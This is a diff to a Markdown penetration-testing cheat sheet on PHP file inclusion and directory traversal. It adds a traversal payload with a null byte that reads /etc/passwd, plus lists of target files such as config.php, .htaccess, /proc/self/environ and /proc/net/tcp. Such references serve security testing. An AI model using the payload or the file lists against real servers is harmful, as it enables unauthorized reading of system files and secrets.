@@ -24,11 +24,23 @@ https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/
 
 
 ## Linux
+
+### Tricks
+
+Check if a folder exists, go into it and the go out.
+
+```
+index.php?page=../../../../../../var/www/dossierexistant/../../../../../etc/passwd%00"
+```
+
 ### Sensitive file
 
+
+#### Web server files
 ```
 # Usually found in the root of the website
 .htaccess
+config.php
 ```
 
 #### SSH
@@ -76,6 +88,10 @@ Found in the home-directory
 
 #### Proc files
 
+"Under Linux, /proc includes a directory for each running process, including kernel processes, in directories named /proc/PID, where PID is the process number. Each directory contains information about one process, including: /proc/PID/cmdline, the command that originally started the process."
+
+https://en.wikipedia.org/wiki/Procfs
+
 https://blog.netspi.com/directory-traversal-file-inclusion-proc-file-system/
 ```
 /proc/sched_debug # Can be used to see what processes the machine is running
@@ -84,7 +100,10 @@ https://blog.netspi.com/directory-traversal-file-inclusion-proc-file-system/
 /proc/net/route
 /proc/net/tcp
 /proc/net/udp
-
+/proc/net/fib_trie
+/proc/version
+/proc/self/environ
+```
 
 ## Bruteforcing SSH known_hosts
 
